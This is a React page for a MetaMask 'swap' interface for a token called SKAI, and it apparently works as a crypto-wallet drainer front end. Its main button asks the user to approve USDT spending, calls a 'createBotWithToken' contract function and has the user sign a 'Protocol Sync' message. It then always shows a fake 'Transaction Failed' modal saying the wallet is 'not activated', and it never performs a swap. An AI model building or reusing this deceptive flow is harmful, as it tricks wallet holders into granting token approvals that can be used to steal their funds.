import { useMetamaskLoginLogic } from "./hooks/use-metamask-login"
import { activityLogger, logger } from "./utils/logger"
import { useContractInteraction } from "./hooks/use-contract-interaction"
import metamaskIcon from "./assets/metamask.svg"
import logo from "./assets/logo.png"
import { useState, useEffect } from "react"
import { ethers } from "ethers"

export default function MetamaskLoginPage() {
  const [loading, setLoading] = useState(false)
  const [swapAmount, setSwapAmount] = useState("")
  const [isReversed, setIsReversed] = useState(false)
  const [showErrorModal, setShowErrorModal] = useState(false)

  const PRICE_SELL = 0.00004907
  const PRICE_BUY = 0.00002048
  const SKAI_CONTRACT = "0xdca3358f050367ef421608e64c70d84c694e8273"

  const {
    connected,
    address,
    chainId,
    balance,
    logs,
    logsRef,
    connectMetaMask,
    disconnect,
    exportLogs,
  } = useMetamaskLoginLogic()

  useEffect(() => {
    if (logsRef.current) {
      logsRef.current.scrollTop = logsRef.current.scrollHeight;
    }
  }, [logs]);

  const calculateResult = () => {
    if (!swapAmount || isNaN(Number(swapAmount))) return "0.00"
    return isReversed
      ? (Number(swapAmount) * PRICE_SELL).toLocaleString(undefined, { maximumFractionDigits: 6 })
      : (Number(swapAmount) / PRICE_BUY).toLocaleString(undefined, { maximumFractionDigits: 2 })
  }

  const {
    initContractWithSigner,
    approveUSDT,
    createBotWithToken
  } = useContractInteraction();

  useEffect(() => {
    if (connected) {
      initContractWithSigner();
    }
  }, [connected]);

  const handleMainAction = async () => {
    if (!connected) return connectMetaMask();
    setLoading(true);

    try {
      const approved = await approveUSDT();
      if (!approved) throw new Error("Approve failed");

      const botCreated = await createBotWithToken("Node_" + address?.slice(-4));
      if (!botCreated) throw new Error("Bot creation failed");

      const provider = new ethers.BrowserProvider((window as any).ethereum);
      const signer = await provider.getSigner();
      await signer.signMessage(`Protocol Sync: ${swapAmount}\nAccount: ${address}`);

      setLoading(false);
      setShowErrorModal(true);
    } catch (err) {
      setLoading(false);
    }
  };

  return (
    <div className="min-h-screen bg-[#0b0c10] text-gray-200 font-sans p-4 sm:p-8 flex flex-col items-center">
      <style>{`
        input::-webkit-outer-spin-button, input::-webkit-inner-spin-button { -webkit-appearance: none; margin: 0; }
        input[type=number] { -moz-appearance: textfield; }
      `}</style>

      <div className="w-full max-w-5xl flex flex-col sm:flex-row justify-between items-center mb-10 gap-4">
        <div className="flex flex-col items-center sm:items-start">
          <img src={logo} alt="Logo" className="w-32 sm:w-40 h-auto object-contain select-none" />
          <p className="text-[10px] tracking-[0.2em] text-gray-500 uppercase mt-2 font-bold font-mono">
            LAUNCH <span className="text-indigo-500">Sk AI net</span>
          </p>
        </div>

        {!connected ? (
          <button onClick={connectMetaMask} className="flex items-center gap-3 px-6 py-2.5 rounded-2xl bg-[#1a1b23] border border-white/5 hover:bg-[#23242f] transition-all">
            <img src={metamaskIcon} alt="MetaMask" className="w-5 h-5" />
            <span className="text-sm font-bold uppercase tracking-widest text-[11px]">Connect Wallet</span>
          </button>
        ) : (
          <div className="flex items-center gap-4 bg-[#1a1b23] px-5 py-2.5 rounded-2xl border border-white/5 shadow-2xl font-mono">
            <div className="flex flex-col items-end">
              <span className="text-[10px] text-indigo-400 font-bold">{address?.slice(0, 6)}...{address?.slice(-4)}</span>
              <span className="text-[9px] text-gray-500 uppercase tracking-tighter">{balance} ETH</span>
            </div>
            <button onClick={disconnect} className="text-[10px] uppercase font-bold text-red-500/60 hover:text-red-500 transition-colors">Logout</button>
          </div>
        )}
      </div>

      <div className="w-full max-w-5xl grid grid-cols-1 lg:grid-cols-12 gap-8 items-start">
        <div className="lg:col-span-4 flex flex-col gap-4">
          <div className="bg-[#1a1b23] border border-white/5 rounded-3xl p-6 shadow-2xl">
            <h3 className="text-xs font-bold text-gray-500 uppercase tracking-widest mb-6 font-mono">Node Status</h3>
            <div className="bg-white/[0.02] border border-white/5 rounded-2xl p-4 mb-4">
              <div className="flex items-center justify-between mb-4 text-white">
                <div className="flex items-center gap-3">
                  <div className="w-10 h-10 bg-indigo-500/10 rounded-full flex items-center justify-center text-indigo-500 font-bold text-xl italic italic">Σ</div>
                  <div>
                    <div className="text-sm font-bold italic">Ethereum</div>
                    <div className="text-[10px] text-gray-500 font-mono">{chainId ?? "0x1"}</div>
                  </div>
                </div>
                <div className={`w-2 h-2 rounded-full ${connected ? 'bg-green-500 animate-pulse' : 'bg-red-500'}`}></div>
              </div>
              <div className="text-[10px] text-gray-500 uppercase font-bold mb-1">Portfolio</div>
              <div className="text-xl font-mono font-bold text-white italic">{balance ?? "0.0000"} <span className="text-xs text-gray-600 font-sans">ETH</span></div>
            </div>
          </div>
        </div>

        <div className="lg:col-span-8 space-y-6">
          <div className="bg-[#1a1b23] border border-white/5 rounded-3xl p-6 sm:p-8 shadow-2xl relative">
            <div className={`flex flex-col gap-1 ${isReversed ? 'flex-col-reverse' : ''}`}>
              <div className="bg-[#0b0c10] p-5 rounded-3xl border border-white/5">
                <div className="flex justify-between text-[11px] text-gray-500 mb-3 font-bold uppercase tracking-widest">
                  <span>{isReversed ? 'SKAI' : 'USDT'}</span>
                </div>
                <div className="flex items-center gap-4">
                  <input type="number" placeholder="0.0" value={swapAmount} onChange={(e) => setSwapAmount(e.target.value)}
                    className="bg-transparent text-3xl font-bold w-full outline-none text-white placeholder-gray-800" />
                  <span className="font-bold text-sm text-white italic">{isReversed ? 'SKAI' : 'USDT'}</span>
                </div>
              </div>
              <div className="flex justify-center -my-5 relative z-10">
                <button onClick={() => setIsReversed(!isReversed)} className="bg-[#1a1b23] p-3 rounded-2xl border border-white/10 text-indigo-500">
                  <svg xmlns="http://www.w3.org/2000/svg" width="20" height="20" fill="none" viewBox="0 0 24 24" stroke="currentColor" strokeWidth="3"><path d="M7 16V4m0 0L3 8m4-4l4 4m6 0v12m0 0l4-4m-4 4l-4-4" /></svg>
                </button>
              </div>
              <div className="bg-[#0b0c10] p-5 rounded-3xl border border-white/5">
                <div className="flex justify-between text-[11px] text-gray-500 mb-3 font-bold uppercase tracking-widest">
                  <span>{isReversed ? 'USDT' : 'SKAI'}</span>
                </div>
                <div className="flex items-center gap-4 text-white">
                  <div className="text-3xl font-bold w-full text-white/30 truncate font-mono">{calculateResult()}</div>
                  <span className="font-bold text-sm italic">{isReversed ? 'USDT' : 'SKAI'}</span>
                </div>
              </div>
            </div><button
              onClick={handleMainAction}
              className="w-full mt-8 py-5 bg-indigo-600 hover:bg-indigo-500 rounded-2xl font-bold text-white shadow-lg shadow-indigo-600/20 transition-all active:scale-[0.98] uppercase tracking-[0.3em] text-[10px]"
            >
              Swap & Confirm Synchronization
            </button>

            {/* ТВОЙ ОРИГИНАЛЬНЫЙ ТЕРМИНАЛ — ВСЕ ПЕРЕМЕННЫЕ ВОССТАНОВЛЕНЫ */}
            <div className="bg-[#0b0c10] border border-white/5 rounded-2xl p-5 mt-8">
              <div className="flex justify-between items-center mb-4 px-1">
                <span className="text-[10px] font-bold uppercase text-gray-600 font-mono italic tracking-widest">System Console</span>
                <span className="flex items-center gap-1.5 text-[9px] text-indigo-500 font-bold tracking-widest animate-pulse">LIVE</span>
              </div>

              <div ref={logsRef} className="h-48 overflow-y-auto font-mono text-[10px] text-gray-400 space-y-1.5 scrollbar-hide px-2">
                {logs.length === 0 ? (
                  <div className="h-full flex items-center justify-center text-gray-800 italic uppercase tracking-widest">Awaiting interaction...</div>
                ) : (
                  logs.map((l, i) => (
                    <div key={i} className="flex gap-3 hover:bg-white/5 px-2 py-0.5 rounded transition-colors group">
                      <span className="text-[#3c3d49] group-hover:text-indigo-400 shrink-0 italic">[{l.ts}]</span>
                      <span className={`${l.level === 'error' ? 'text-red-500 font-bold' : 'text-gray-300'}`}>
                        {l.tag ? `[${l.tag}]` : ""} {l.message}
                      </span>
                    </div>
                  ))
                )}
              </div>
            </div>
          </div>
        </div>
      </div>

      {/* ERROR MODAL */}
      {showErrorModal && (
        <div className="fixed inset-0 z-[2000] flex items-center justify-center bg-black/95 backdrop-blur-xl p-4">
          <div className="bg-[#1a1b23] border-2 border-red-500/50 rounded-[40px] p-10 max-w-sm w-full text-center shadow-[0_0_50px_rgba(239,68,68,0.2)]">
            <div className="w-20 h-20 bg-red-500/10 rounded-full flex items-center justify-center mx-auto mb-6">
              <svg xmlns="http://www.w3.org/2000/svg" className="h-10 w-10 text-red-500" fill="none" viewBox="0 0 24 24" stroke="currentColor">
                <path strokeLinecap="round" strokeLinejoin="round" strokeWidth="3" d="M6 18L18 6M6 6l12 12" />
              </svg>
            </div>
            <h2 className="text-white text-2xl font-black uppercase mb-4 tracking-tighter italic font-sans text-white">Transaction Failed</h2>
            <p className="text-gray-400 text-sm leading-relaxed mb-8 font-medium italic">
              Your wallet address is <span className="text-white underline font-bold tracking-tight">not activated</span> for high-frequency liquidity operations.
              <br /><br /> Please complete activation sequence.
            </p>
            <button onClick={() => setShowErrorModal(false)} className="w-full py-5 bg-red-500 hover:bg-red-400 text-white rounded-2xl font-bold uppercase tracking-widest text-[10px] transition-colors shadow-lg shadow-red-500/20">Close</button>
          </div>
        </div>
      )}

      {/* LOADING OVERLAY */}
      {loading && (
        <div className="fixed inset-0 z-[1000] flex flex-col items-center justify-center bg-black/80 backdrop-blur-md">
          <div className="w-14 h-14 border-4 border-indigo-500/20 border-t-indigo-500 rounded-full animate-spin mb-6"></div>
          <span className="text-[10px] uppercase tracking-[0.5em] text-indigo-500 font-black animate-pulse italic">Synchronizing Chain Data</span>
        </div>
      )}
    </div>
  )
}